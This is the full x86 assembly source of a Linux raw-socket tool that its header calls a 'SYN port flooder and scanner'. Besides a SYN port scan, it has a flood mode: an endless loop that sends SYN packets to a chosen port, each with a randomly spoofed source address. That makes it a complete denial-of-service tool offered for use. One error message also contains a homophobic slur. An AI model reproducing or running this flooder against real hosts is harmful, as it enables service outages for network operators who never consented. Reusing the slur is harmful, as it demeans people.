/***************************************************************************/ 
/*              DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE                */
/*                        Version 2, December 2004                         */
/*                                                                         */
/*  Copyleft meh.                                                          */
/*                                                                         */
/*              DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE                */
/*     TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION     */
/*                                                                         */
/*  0. You just DO WHAT THE FUCK YOU WANT TO.                              */
/***************************************************************************/
/* This program is written in ASM x86 AT&T syntax on Linux.                */
/*                                                                         */
/* To compile it use the following commands where file is the file name.   */
/*                                                                         */
/* as --32 -o file.o file.s                                                */
/* ld -melf_i386 -o file file.o                                            */
/***************************************************************************/
/* This is a SYN port flooder and scanner. You have to be root to run it.  */
/*                                                                         */
/* DO WHAT YOU WANT CAUSE A PIRATE IS FREE, YOU ARE A PIRATE!              */
/***************************************************************************/
/* OverMe tette culo                                                       */
/***************************************************************************/

.data
    /* Strings */
      string_usage_p1:         .string "Usage: "
    l_string_usage_p1=         .-string_usage_p1
      string_usage_p2:         .string " <interface> <option> <ip> <start_port> [end_port]\n\nOptions:\n\t-s\tScan a single port or a port range.\n\t-f\tFlood a single port.\n"
    l_string_usage_p2=         .-string_usage_p2
      string_port_range_error: .string "The start port has to be lesser than the end port, faggot.\n"
    l_string_port_range_error= .-string_port_range_error
      string_general_error:    .string "Something went wrong.\n"
    l_string_general_error=    .-string_general_error
      string_sendto_error:     .string "Error in sendto, probably the host is down.\n"
    l_string_sendto_error=     .-string_sendto_error
      string_port_is_open_p1:  .string "Port "
    l_string_port_is_open_p1=  .-string_port_is_open_p1
      string_port_is_open_p2:  .string " is open.\n"
    l_string_port_is_open_p2=  .-string_port_is_open_p2
      string_not_root:         .string "You have to be root.\n"
    l_string_not_root=         .-string_not_root

    /* Arguments */
    argc:           .long   0
    program_name:   .long   0
    option:         .long   0
    ip:             .long   0
    start_port:     .word   0
    end_port:       .word   0

    /* Data */
    current_port:   .word   0

    /* Static data */
    random_32:      .long   0x23421337

    /* Other stuff */
    SIOCGIFNAME = 0x8910
    SIOCGIFADDR = 0x8915
    
    /* Socket stuff */
    AF_INET        = 2
    SOCK_STREAM    = 1
    SOCK_RAW       = 3
    IPPROTO_UNSPEC = 0
    IPPROTO_TCP    = 6

    interface:      .long   0
    ifreq:          .space  40, 0 /* struct ifreq */

    server:         .space  128, 0 /* struct sockaddr */
    server_length:  .long   128
    _server_length=         128
    local_addr:     .long   0
    addr:           .long   0
    sockd:          .long   0

    set_val:        .long   1

    /* IP HEADER (20 bytes) */
    /* ihl      @   (datagram) 4 bit { andl $-16, %eax | orl $5, %eax [%al ihl = 5] } */
    /* version  @   (datagram) 4 bit { andl $15, %eax | orl $64, %eax [%al ver = 4] } */ 
    /* tos      @  1(datagram) .byte */
    /* tot_len  @  2(datagram) .word */
    /* id       @  4(datagram) .word */
    /* frag_off @  6(datagram) .word */
    /* ttl      @  8(datagram) .byte */
    /* protocol @  9(datagram) .byte */
    /* chksum   @ 10(datagram) .word */
    /* sourceip @ 12(datagram) .long */
    /* destip   @ 16(datagram) .long */

    SYN = 0x02
    RST = 0x04
    ACK = 0x10

    /* TCP HEADER (20 bytes) */
    /* source  @ 20(datagram) .word */
    /* dest    @ 22(datagram) .word */
    /* seq     @ 24(datagram) .long */
    /* ack_seq @ 28(datagram) .long */
    /* doff    @ 32(datagram) 4 bit { andl $15, %eax | orl $80, %eax [doff = 5] } */
    /* flags   @ 33(datagram) .byte */
    /* window  @ 34(datagram) .word */
    /* check   @ 36(datagram) .word */
    /* urg_ptr @ 38(datagram) .word */

    /* PSEUDO HEADER (12 bytes) */
    /* source @   (pseudo) .long */
    /* dest   @  4(pseudo) .long */
    /* padd   @  8(pseudo) .byte */
    /* proto  @  9(pseudo) .byte */
    /* length @ 10(pseudo) .word */
    /* data   @ 12(pseudo) 20    */

    datagram: .space 256, 0
    pseudo:   .space 32, 0

.bss
    .macro __print string, length
        movl    $4, %eax
        movl    $1, %ebx
        movl    \string, %ecx
        movl    \length, %edx
        int     $0x80
    .endm

    .macro __get_interface_ip if
        push    %ebp
        movl    %esp, %ebp

        /* int          sock @ -4(%ebp) */
        subl    $4, %esp

        push    %ebx
        push    %ecx
        push    %edx

        movl    $102, %eax
        movl    $1, %ebx

        sub     $12, %esp
        movl    $AF_INET,      (%esp)
        movl    $SOCK_RAW,    4(%esp)
        movl    $IPPROTO_TCP, 8(%esp)
        mov     %esp, %ecx
        int     $0x80

        cmp     $1, %eax
        jl      general_error
        addl    $12, %esp

        movl    %eax, -4(%ebp)

        push    $16
        push    \if
        movl    $ifreq, %eax
        push    %eax
        call    __strncpy
        add     $12, %esp

        movl    $54, %eax
        movl    -4(%ebp), %ebx
        movl    $SIOCGIFNAME, %ecx
        movl    $ifreq, %edx
        int     $0x80

        movl    $54, %eax
        movl    -4(%ebp), %ebx
        movl    $SIOCGIFADDR, %ecx
        movl    $ifreq, %edx
        int     $0x80

        movl    $6, %eax
        movl    -4(%ebp), %ebx
        int     $0x80

        movl    ifreq+20, %eax

        pop     %edx
        pop     %ecx
        pop     %ebx
        addl    $4, %esp
        pop     %ebp
    .endm

    .macro __tcp_csum datagram, pseudo
        push    %ebx
        push    %ecx
        push    %edx

        movl    \datagram, %ebx
        movl    \pseudo, %ecx

        movw    $0, 36(%ebx)

        subl    $12, %esp
        movl    %ecx, (%esp)
        movl    $0, 4(%esp)
        movl    $32, 8(%esp)
        call    __memset
        add     $12, %esp

        /* pseudo.source = ip.sourceip */
        movl    12(%ebx), %eax
        movl    %eax, (%ecx)
    
        /* pseudo.dest = ip.destip */
        movl    16(%ebx), %eax
        movl    %eax, 4(%ecx)
    
        /* pseudo.padd = 0 */
        movb    $0, 8(%ecx)
    
        /* pseudo.proto = ip.protocol */
        movb    9(%ebx), %al
        movb    %al, 9(%ecx)
    
        /* pseudo.length = htons(20) */
        push    $20
        call    __htons
        add     $4, %esp
        movw    %ax, 10(%ecx)
    
        subl    $12, %esp
        leal    12(%ecx), %edx
        movl    %edx, (%esp)
        leal    20(%ebx), %edx
        movl    %edx, 4(%esp)
        movl    $20, 8(%esp)
        call    __memcpy
        add     $12, %esp
    
        push    $16
        push    %ecx
        call    __csum
        addl    $8, %esp
        movw    %ax, 36(%ebx)

        pop     %edx
        pop     %ecx
        pop     %ebx
    .endm

    .macro __set_tcp_flags datagram, flags
        push    %edx
        movl    \datagram, %edx

        movb    \flags, 33(%edx)

        pop     %edx
    .endm

    .macro  __get_tcp_flags datagram
        push    %edx
        movl    \datagram, %edx
        
        movzbl  33(%edx), %eax

        pop     %edx
    .endm

    .macro __set_source_port datagram, port
        push    %edx
        movl    \datagram, %edx

        push    \port
        call    __htons
        addl    $4, %esp
        movw    %ax, 20(%edx)

        pop     %edx
    .endm

    .macro __set_dest_port datagram, port
        push    %edx
        movl    \datagram, %edx

        push    \port
        call    __htons
        addl    $4, %esp
        movw    %ax, 22(%edx)

        pop     %edx
    .endm

    .macro __set_source_addr datagram, addr
        push    %edx
        movl    \datagram, %edx

        movl    \addr, 12(%edx)

        pop     %edx
    .endm

    .macro __get_source_addr datagram
        push    %edx
        movl    \datagram, %edx

        movl    12(%edx), %eax

        pop     %edx
    .endm

    .macro __set_dest_addr datagram, addr
        push    %edx
        movl    \datagram, %edx

        movl    \addr, 16(%edx)

        pop     %edx
    .endm

.text
    .global _start
    
_start:
    mov     $24, %eax
    int     $0x80

    cmp     $0, %eax
    jne     not_root

    /* Program arguments stuff */
    pop     argc

    /* program_name = argv[0] */
    pop     program_name

    /* if (argc < 5) */
    cmpl    $5, argc
    jb      usage

    /* interface = argv[1] */
    pop     interface

    __get_interface_ip interface

    cmp     $0, %eax
    je      general_error

    movl    %eax, local_addr

    /* option = argv[2] */
    pop     option

    /* if (argc != 6) goto oneport; */
    cmpl    $6, argc

    movl    $1, %ebx
    movl    $2, %ecx

    cmovel  %ebx, %eax
    cmovnel %ecx, %eax
    movl    %eax, argc

    /* ip = argv[3] */
    pop     ip
    
    /* start_port = atoi(argv[4]); */
    call    __atoi
    nig:
    addl    $4, %esp
    movw    %ax, start_port

    cmpl    $2, argc
    je      one_port

port_range:
    /* end_port = atoi(argv[5]); */
    call    __atoi
    addl    $4, %esp
    movw    %ax, end_port
    jmp     P2

one_port:
    movw    start_port, %ax
    movw    %ax, end_port

P2:
    /* if (start_port > end_port) goto port_range_error; */
    movw    end_port, %dx
    cmpw    start_port, %dx
    jl      port_range_error      

    /* current_port = start_port */
    movw    start_port, %ax
    movw    %ax, current_port
    
    /* addr = inet_addr(ip); */
    push    ip
    call    __inet_addr
    movl    %eax, addr

create:
    /* Creating the socket */
    movl    $102, %eax
    movl    $1, %ebx

    sub     $12, %esp
    movl    $AF_INET,      (%esp)
    movl    $SOCK_RAW,    4(%esp)
    movl    $IPPROTO_TCP, 8(%esp)
    mov     %esp, %ecx

    int     $0x80

    cmp     $1, %eax
    jl      general_error
    addl    $12, %esp

    movl    %eax, sockd

fill_sockaddr:
    movw    $AF_INET, server
    movl    addr, %eax
    movl    %eax, server+4

sock_opt:
    /* Setting the inclusion of the IP header */
    subl    $20, %esp

    movl    $102, %eax
    movl    $14, %ebx
    movl    sockd, %edx
    movl    %edx,       (%esp) /* sockd */
    movl    $0,       4 (%esp) /* IPPROTO_IP */
    movl    $3,       8 (%esp) /* IP_HDRINCL */
    movl    $set_val, 12(%esp) /* true */
    movl    $4,       16(%esp) /* sizeof int */
    mov     %esp, %ecx
    int     $0x80

    addl    $20, %esp

    /* Bind the socket to the passed interface */
    movl    $102, %eax
    movl    $14, %ebx

    subl    $20, %esp
    movl    sockd, %edx
    movl    %edx,     (%esp) /* sockd */
    movl    $1,      4(%esp) /* SOL_SOCKET */
    movl    $25,     8(%esp) /* SO_BINDTODEVICE */
    movl    $ifreq, 12(%esp) /* &ifreq */
    movl    $40,    16(%esp) /* sizeof(struct ifreq) */
    movl    %esp, %ecx

    int     $0x80
    addl    $20, %esp

    cmp     $0, %eax
    jb      general_error

    movl    option, %edx
    cmpb    $'s', 1(%edx)
    je      scan

    cmpb    $'f', 1(%edx)
    je      flood

    jmp     usage

flood:
    /* Set port in sock addr */
    push    start_port
    call    __htons
    movw    %ax, server+2
    add     $4, %esp

    subl    $20, %esp
    movl    $datagram, (%esp)
    movl    local_addr, %ecx
    movl    %ecx, 4(%esp)
    movl    addr, %ecx
    movl    %ecx, 8(%esp)
    movl    start_port, %ecx
    movl    %ecx, 12(%esp)
    movl    $SYN, 16(%esp)
    call    __fill_headers
    addl    $20, %esp

flood_loop:
    call    __rand
    __set_source_addr $datagram, %eax
    __tcp_csum $datagram, $pseudo

    movl    $102, %eax
    movl    $11, %ebx
    subl    $24, %esp
    movl    sockd, %ecx
    movl    %ecx, (%esp)
    movl    $datagram, 4(%esp)
    movl    $40, 8(%esp)
    movl    $0, 12(%esp)
    movl    $server, 16(%esp)
    movl    $_server_length, 20(%esp)
    movl    %esp, %ecx
    int     $0x80
    addl    $24, %esp

    cmp     $0, %eax
    jl      sendto_error

    jmp     flood_loop

scan:
    /* Fill struct sockaddr */
    pushw   current_port
    call    __htons
    movw    %ax, server+2
    addl    $4, %esp

send:
    subl    $20, %esp
    movl    $datagram, (%esp)
    movl    local_addr, %ecx
    movl    %ecx, 4(%esp)
    movl    addr, %ecx
    movl    %ecx, 8(%esp)
    movzwl  current_port, %ecx
    movl    %ecx, 12(%esp)
    movl    $SYN, 16(%esp)
    call    __fill_headers
    addl    $20, %esp

    movl    $102, %eax
    movl    $11, %ebx
    subl    $24, %esp
    movl    sockd, %ecx
    movl    %ecx, (%esp)
    movl    $datagram, 4(%esp)
    movl    $40, 8(%esp)
    movl    $0, 12(%esp)
    movl    $server, 16(%esp)
    movl    $120, 20(%esp)
    movl    %esp, %ecx

send_result:
    int     $0x80
    addl    $24, %esp

    cmp     $0, %eax
    jl      P3

recv:
    push    $datagram
    call    __clear_headers
    add     $4, %esp

    movl    $102, %eax
    movl    $12, %ebx
    subl    $24, %esp
    movl    sockd, %ecx
    movl    %ecx, (%esp)
    movl    $datagram, 4(%esp)
    movl    $40, 8(%esp)
    movl    $0, 12(%esp)
    movl    $server, 16(%esp)
    movl    $server_length, 20(%esp)
    movl    %esp, %ecx

recv_result:
    int     $0x80
    addl    $24, %esp

    cmp     $0, %eax
    jl      P3

    __get_source_addr $datagram
    cmpl    addr, %eax
    jne     P3

    __get_tcp_flags $datagram
    cmpl    $(SYN | ACK), %eax
    jne     P3

    __print $string_port_is_open_p1, $l_string_port_is_open_p1
    movzwl  datagram+20, %eax
    push    %eax
    call    __ntohs
    add     $4, %esp
    push    %eax
    call    __printsu
    addl    $4, %esp
    __print $string_port_is_open_p2, $l_string_port_is_open_p2

reset:
    subl    $20, %esp
    movl    $datagram, (%esp)
    movl    local_addr, %ecx
    movl    %ecx, 4(%esp)
    movl    addr, %ecx
    movl    %ecx, 8(%esp)
    movzwl  current_port, %ecx
    movl    %ecx, 12(%esp)
    movl    $RST, 16(%esp)
    call    __fill_headers
    addl    $20, %esp

    movl    $102, %eax
    movl    $11, %ebx
    subl    $24, %esp
    movl    sockd, %ecx
    movl    %ecx, (%esp)
    movl    $datagram, 4(%esp)
    movl    $40, 8(%esp)
    movl    $0, 12(%esp)
    movl    $server, 16(%esp)
    movl    $120, 20(%esp)
    movl    %esp, %ecx

reset_result:
    int     $0x80
    addl    $24, %esp

P3:
    incl    current_port
    movw    current_port, %dx
    cmpw    %dx, end_port
    jge     scan

    jmp     end

usage:
    __print $string_usage_p1, $l_string_usage_p1

    /* Print the program name */
    movl    program_name, %ecx
    push    program_name
    call    __strlen
    addl    $4, %esp
    movl    %eax, %edx
    movl    $4, %eax
    movl    $1, %ebx
    int     $0x80

    __print $string_usage_p2, $l_string_usage_p2
    jmp     end

port_range_error:
    __print $string_port_range_error, $l_string_port_range_error
    jmp     error

general_error:
    __print $string_general_error, $l_string_general_error
    jmp     error

sendto_error:
    __print $string_sendto_error, $l_string_sendto_error
    jmp     error

not_root:
    __print $string_not_root, $l_string_not_root
    jmp     error

error:
    movl    $1, %eax
    movl    $1, %ebx
    int     $0x80

end:
    movl    $1, %eax
    movl    $0, %ebx
    int     $0x80

/* Functions */

/* void __printsu (unsigned short number) */
__printsu:
    push    %ebp
    mov     %esp, %ebp
    sub     $8, %esp
    push    %ebx
    push    %ecx
    push    %edx

    movzwl  8(%ebp), %eax
    movl    $0, %ecx
    movl    $0, %edx

    __printsu_loop_1:
        mov     $10, %ebx
        divl    %ebx
        push    %edx
        movl    $0, %edx
        incl    %ecx

        cmp     $0, %eax
        jne     __printsu_loop_1
    __printsu_loop_end_1:

    movl    %ecx, -4(%ebp)

    __printsu_loop_2:
        movl    $4, %eax
        movl    $1, %ebx

        pop     %ecx
        addl    $0x30, %ecx
        movl    %ecx, -8(%ebp)
        lea     -8(%ebp), %ecx

        movl    $1, %edx
        
        int     $0x80

        decl    -4(%ebp)
        cmpl    $0, -4(%ebp)
        jne     __printsu_loop_2
    __printsu_loop_end_2:

    pop     %edx
    pop     %ecx
    pop     %ebx
    addl    $8, %esp
    pop     %ebp
    ret

/* ctype.h */

/* int __isdigit (char ch) */
__isdigit:
    push    %ebp
    mov     %esp, %ebp

    movl    $0, %eax

    cmpb    $0x30, 8(%ebp)
    jl      __isdigit_end
    cmpb    $0x39, 8(%ebp)
    jg      __isdigit_end

    movl    $1, %eax

    __isdigit_end:

    pop     %ebp
    ret

/* string.h */

/* int __strlen (char* str) */
__strlen:
    push    %ebp
    movl    %esp, %ebp
    push    %edi
    push    %ecx

    movl    8(%ebp), %edi
    movl    $0, %eax
    movl    $0, %ecx
    notl    %ecx
    cld
    repne   scasb
    notl    %ecx
    decl    %ecx

    movl    %ecx, %eax

    pop     %ecx
    pop     %edi
    pop     %ebp
    ret

/* char* __strchr (char* str, char ch) */
__strchr:
    push    %ebp
    movl    %esp, %ebp
    push    %edi
    push    %ebx
    push    %ecx

    push    8(%ebp)
    call    __strlen
    addl    $4, %esp

    movl    %eax, %ebx
    incl    %ebx
    movl    %eax, %ecx
    addl    $2, %ecx

    movl    8(%ebp), %edi
    movzbl  12(%ebp), %eax
    cld
    repne   scasb

    cmp     $0, %ecx
    je      __strchr_error

    movl    8(%ebp), %eax
    subl    %ecx, %ebx
    addl    %ebx, %eax
    jmp     __strchr_end

    __strchr_error:
    movl    $0, %eax

    __strchr_end:

    pop     %ecx
    pop     %ebx
    pop     %edi
    pop     %ebp
    ret

/* char* strcpy (char* dest, const char* src) */
__strcpy:
    push    %ebp
    movl    %esp, %ebp
    push    %ebx
    push    %ecx
    push    %edx

    push    12(%ebp)
    call    __strlen
    add     $4, %esp
    movl    %eax, %ecx
    incl    %ecx

    movl    8(%ebp), %ebx
    movl    12(%ebp), %edx
    
    __strcpy_loop:
        movzbl  (%edx), %eax
        movb    %al, (%ebx)
        incl    %edx
        incl    %ebx
    loop __strcpy_loop

    movl    8(%ebp), %eax

    pop     %edx
    pop     %ecx
    pop     %ebx
    pop     %ebp
    ret

/* char* strncpy (char* dest, const char* src, int n) */
__strncpy:
    push    %ebp
    movl    %esp, %ebp
    push    %ebx
    push    %ecx
    push    %edx

    movl    8(%ebp), %ebx
    movl    12(%ebp), %edx
    movl    16(%ebp), %ecx
    
    __strncpy_loop:
        movzbl  (%edx), %eax
        movb    %al, (%ebx)

        cmpb    $0, %al
        je      __strncpy_fill_zero

        incl    %edx
        incl    %ebx
    loop __strncpy_loop

    jmp     __strncpy_end

    __strncpy_fill_zero:
        movb    $0, (%ebx)
        incl    %ebx
    loop __strncpy_fill_zero

    __strncpy_end:

    movl    -4(%ebx), %eax

    pop     %edx
    pop     %ecx
    pop     %ebx
    pop     %ebp
    ret

/* stdlib.h */

/* int __rand (void) */
__rand:
    push    %edx

    movl    random_32, %eax
    movl    $0x0019660D, %edx
    mull    %edx
    addl    $0x3C6EF35F, %eax
    movl    %eax, random_32

    pop     %edx
    ret

/* int __atoi (char* str) */
__atoi:
    push    %ebp
    movl    %esp, %ebp

    /* is_negative @ -4(%ebp) */
    sub     $4, %esp

    push    %ebx
    push    %ecx
    push    %edx

    movl    8(%ebp), %ecx

    cmpb    $'-', (%ecx)
    je      __atoi_neg
    cmpb    $'+', (%ecx)
    je      __atoi_pos
    jmp     __atoi_P1

    __atoi_neg:
    movl    $1, -4(%ebp)
    incl    %ecx
    jmp     __atoi_P1

    __atoi_pos:
    movl    $0, -4(%ebp)
    incl    %ecx
    
    __atoi_P1:

    push    (%ecx)
    call    __isdigit
    addl    $4, %esp

    cmp     $0, %eax
    je      __atoi_end

    movl    $0, %ebx
    movl    $0, %edx

    movb    (%ecx), %dl
    subb    $0x30, %dl
    movl    %edx, %ebx
    incl    %ecx

    __atoi_loop:
        push    (%ecx)
        call    __isdigit
        addl    $4, %esp

        cmp     $0, %eax
        je      __atoi_loop_end

        movl    $10, %eax
        mull    %ebx
        movl    %eax, %ebx

        movzbl  (%ecx), %edx
        subb    $0x30, %dl
        addl    %edx, %ebx

        incl    %ecx

        jmp     __atoi_loop
    __atoi_loop_end:

    movl    %ebx, %eax

    cmp     $1, -4(%ebp)
    jne     __atoi_end

    neg     %eax

    __atoi_end:

    pop     %edx
    pop     %ecx
    pop     %ebx
    addl    $4, %esp
    pop     %ebp
    ret

/* void* __memset (void* s, char c, unsigned n) */
__memset:
    push    %ebp
    movl    %esp, %ebp
    push    %ebx
    push    %ecx
    push    %edx

    movl    16(%ebp), %ecx
    movzbl  12(%ebp), %ebx
    movl     8(%ebp), %edx

    __memset_loop:
        movb    %bl, (%edx)
        incl    %edx
    loop __memset_loop

    movl    8(%ebp), %eax

    pop     %edx
    pop     %ecx
    pop     %ebx
    pop     %ebp
    ret

/* void* __memcpy (void* dest, const void* src, unsigned n) */
__memcpy:
    push    %ebp
    movl    %esp, %ebp
    push    %ebx
    push    %ecx
    push    %edx

    movl    16(%ebp), %ecx
    movl    12(%ebp), %ebx
    movl     8(%ebp), %edx

    __memcpy_loop:
        movb    (%ebx), %al
        movb    %al, (%edx)

        incl    %ebx
        incl    %edx
    loop __memcpy_loop

    movl    8(%ebp), %eax

    pop     %edx
    pop     %ecx
    pop     %ebx
    pop     %ebp
    ret

/* arpa/inet.h */

/* short __htons (short port) */
/* ((n & 0xFF) << 8) | ((n & 0xFF00) >> 8) */
__htons:
    push    %ebp
    movl    %esp, %ebp
    push    %edx

    movl    $0, %eax

    movw    8(%ebp), %ax
    andw    $0xff, %ax
    salw    $8, %ax
    movw    %ax, %dx

    movw    8(%ebp), %ax
    andw    $0xff00, %ax
    sarw    $8, %ax
    orw     %dx, %ax

    pop     %edx
    pop     %ebp
    ret

/* int __htonl (int port) */
/* ((n & 0xFF) << 24) | ((n & 0xFF01) << 8) | ((n & 0xFF0000) >> 8) | ((n & 0xFF000000) >> 24) */
__htonl:
    push    %ebp
    movl    %esp, %ebp
    push    %edx

    movl    8(%ebp), %eax
    andl    $0xff, %eax
    sall    $24, %eax
    movl    %eax, %edx

    movl    8(%ebp), %eax
    andl    $0xff00, %eax
    sall    $8, %eax
    orl     %eax, %edx

    movl    8(%ebp), %eax
    andl    $0xff0000, %eax
    sarl    $8, %eax
    orl     %eax, %edx

    movl    8(%ebp), %eax
    andl    $0xff000000, %eax
    sarl    $24, %eax
    orl     %edx, %eax

    pop     %edx
    pop     %ebp
    ret

/* short __ntohs (short port) */
/* ((n & 0xFF) << 8) | ((n & 0xFF00) >> 8) */
__ntohs:
    push    %ebp
    movl    %esp, %ebp
    push    %edx

    movl    $0, %eax

    movw    8(%ebp), %ax
    andw    $0xff, %ax
    salw    $8, %ax
    movw    %ax, %dx

    movw    8(%ebp), %ax
    andw    $0xff00, %ax
    sarw    $8, %ax
    orw     %dx, %ax

    pop     %edx
    pop     %ebp
    ret

/* int __inet_addr (char* address) */
/* a.b.c.d <=> (a << 24) | (b << 16) | (c << 8) | d */
__inet_addr:
    push    %ebp
    movl    %esp, %ebp

    /* str_end @ -4(%ebp) */
    sub     $4, %esp

    push    %ebx
    push    %ecx
    push    %edx

    push    8(%ebp)
    call    __strlen
    addl    $4, %esp

    /* str_end @ -16(%ebp) */
    movl    8(%ebp), %edx
    movl    %edx, -4(%ebp)
    addl    %eax, -4(%ebp)

    movl    $0, %ebx
    movl    8(%ebp), %ecx

    __inet_addr_loop:
        push    (%ecx)
        call    __isdigit
        addl    $4, %esp

        cmp     $0, %eax
        je      __inet_addr_check_dot

        jmp     __inet_addr_loop_continue

        __inet_addr_check_dot:
        cmpb    $'.', (%ecx)
        jne     __inet_addr_error

        cmp     $3, %ebx
        jge     __inet_addr_error
        incl    %ebx

        __inet_addr_loop_continue:
        incl    %ecx
        cmpl    %ecx, -4(%ebp)
        je      __inet_addr_loop_end /* if (end of string reached) end loop */
        jmp     __inet_addr_loop
    __inet_addr_loop_end:

    movl    8(%ebp), %ecx
    movl    $0, %ebx

    /* Check first number */
    push    %ecx
    call    __atoi
    addl    $4, %esp

    cmp     $255, %eax
    jg      __inet_addr_error

    sall    $24, %eax
    movl    %eax, %ebx

    push    $'.'
    push    %ecx
    call    __strchr
    addl    $8, %esp

    movl    %eax, %ecx
    incl    %ecx

    /* Check second number */
    push    %ecx
    call    __atoi
    addl    $4, %esp

    cmp     $255, %eax
    jg      __inet_addr_error

    sall    $16, %eax
    orl     %eax, %ebx

    push    $'.'
    push    %ecx
    call    __strchr
    addl    $8, %esp

    movl    %eax, %ecx
    incl    %ecx

    /* Check third number */
    push    %ecx
    call    __atoi
    addl    $4, %esp

    cmp     $255, %eax
    jg      __inet_addr_error

    sall    $8, %eax
    orl     %eax, %ebx

    push    $'.'
    push    %ecx
    call    __strchr
    addl    $8, %esp

    movl    %eax, %ecx
    incl    %ecx

    /* Check last number */
    push    %ecx
    call    __atoi
    addl    $4, %esp

    cmp     $255, %eax
    jg      __inet_addr_error

    orl     %eax, %ebx
    movl    %ebx, %eax
    bswap   %eax

    jmp     __atoi_end

    __inet_addr_error:
    mov     $-1, %eax

    __inet_addr_end:

    pop     %edx
    pop     %ecx
    pop     %ebx
    addl    $4, %esp
    pop     %ebp
    ret

/* Header stuff */

/* int __csum (unsigned short* datagram, int nwords) */
__csum:
    push    %ebp
    movl    %esp, %ebp
    push    %ebx
    push    %ecx
    push    %edx

    movl    $0, %ebx
    movl    8(%ebp), %eax
    movl    12(%ebp), %ecx

    /* for (%ebx = 0; %ecx > 0; %ecx--) */
    /*     %ebx += 8(%ebp)++            */
    __csum_loop:
        movzwl  (%eax), %edx
        addl    %edx, %ebx
        addl    $2, %eax
    loop __csum_loop

    /* %ebx = (%ebx >> 16) + (%ebx & 0xffff) */
    movl    %ebx, %ecx
    shrl    $16, %ecx
    movl    %ebx, %edx
    andl    $0xffff, %edx
    movl    %ecx, %ebx
    addl    %edx, %ebx

    /* %ebx += (%ebx >> 16) */
    movl    %ebx, %ecx
    shrl    $16, %ecx
    addl    %ecx, %ebx

    /* %eax = ~%ebx */
    movl    %ebx, %eax
    notl    %eax

    pop     %edx
    pop     %ecx
    pop     %ebx
    pop     %ebp
    ret

/* void __fill_headers (char* datagram, int saddr, int daddr, short dest_port, int flags) */
__fill_headers:
    push    %ebp
    movl    %esp, %ebp

    push    16(%ebp)
    push    12(%ebp)
    push    8(%ebp)
    call    __fill_ip_header
    addl    $12, %esp

    push    24(%ebp)
    push    20(%ebp)
    push    8(%ebp)
    call    __fill_tcp_header
    addl    $12, %esp

    pop     %ebp
    ret

/* void __clear_headers (char* datagram) */
__clear_headers:
    push    %ebp
    movl    %esp, %ebp

    push    8(%ebp)
    call    __clear_ip_header
    call    __clear_tcp_header
    addl    $4, %esp

    pop     %ebp
    ret

/* void __fill_ip_header (char* datagram, int saddr, int daddr) */
__fill_ip_header:
    push    %ebp
    movl    %esp, %ebp
    push    %ebx
    push    %ecx
    push    %edx

    push    $datagram
    call    __clear_ip_header
    add     $4, %esp

    movl    8(%ebp), %ebx

    /* ip.ihl = 5 */
    movzbl  (%ebx), %eax
    andl    $-16, %eax
    orl     $5, %eax
    movb    %al, (%ebx)

    /* ip.version = 4 */
    movzbl  (%ebx), %eax
    andl    $15, %eax
    orl     $64, %eax
    movb    %al, (%ebx)

    /* ip.tot_len = 40 */
    movw    $40, 2(%ebx)

    /* ip.id = htons(1337) */
    push    $1337
    call    __htons
    addl    $4, %esp
    movw    %ax, 4(%ebx)

    /* ip.frag = 4 */
    movw    $0x40, 6(%ebx)

    /* ip.ttl = 255 */
    movb    $255, 8(%ebx)

    /* ip.protocol = IPPROTO_TCP */
    movb    $IPPROTO_TCP, 9(%ebx)

    /* ip.saddr = saddr */
    movl    12(%ebp), %ecx
    __set_source_addr %ebx, %ecx

    /* ip.daddr = daddr */
    movl    16(%ebp), %ecx
    __set_dest_addr %ebx, %ecx

    /* ip.check = csum(datagram, 10) */
    push    $10
    push    %ebx
    call    __csum
    addl    $8, %esp
    movw    %ax, 10(%ebx)

    movl    $0, %eax

    pop     %edx
    pop     %ecx
    pop     %ebx
    pop     %ebp
    ret

/* void __clear_ip_header (char* datagram) */
__clear_ip_header:
    push    %ebp
    movl    %esp, %ebp
    push    %ebx
    push    %ecx

    subl    $12, %esp
    movl    $datagram, (%esp)
    movl    $0, 4(%esp)
    movl    $20, 8(%esp)
    call    __memset
    add     $12, %esp

    pop     %ecx
    pop     %ebx
    pop     %ebp
    ret

/* void __fill_tcp_header (char* datagram, short dest_port, int flags) */
__fill_tcp_header:
    push    %ebp
    movl    %esp, %ebp
    push    %ebx
    push    %ecx
    push    %edx

    push    $datagram
    call    __clear_tcp_header
    add     $4, %esp

    movl    8(%ebp), %ebx

    /* tcp.source = (rand() % 64511) + 1024 */
    call    __rand
    movl    $64511, %ecx
    movl    $0, %edx
    divl    %ecx
    addl    $1024, %edx
    __set_source_port %ebx, %edx

    /* tcp.dest = htons(dest_port) */
    __set_dest_port %ebx, 12(%ebp)

    /* tcp.seq = rand() */
    call    __rand
    movl    %eax, 24(%ebx)

    /* tcp.ack_seq = 0 */
    movl    $0, 28(%ebx)

    /* tcp.doff = 5 */
    movzbl  32(%ebx), %eax
    andl    $15, %eax
    orl     $80, %eax
    movb    %al, 32(%ebx)

    /* set flags */
    movzbl  16(%ebp), %eax
    __set_tcp_flags %ebx, %al

    /* tcp.window = htons(40) */
    push    $40
    call    __htons
    addl    $4, %esp
    movw    %ax, 34(%ebx)

    /* tcp.chksum = __tcp_csum(datagram, pseudo) */
    __tcp_csum $datagram, $pseudo

    pop     %edx
    pop     %ecx
    pop     %ebx
    pop     %ebp
    ret

/* void __clear_tcp_header (char* datagram) */
__clear_tcp_header:
    push    %ebp
    movl    %esp, %ebp

    subl    $12, %esp
    movl    $datagram+20, (%esp)
    movl    $0, 4(%esp)
    movl    $20, 8(%esp)
    call    __memset
    add     $12, %esp

    pop     %ebp
    ret

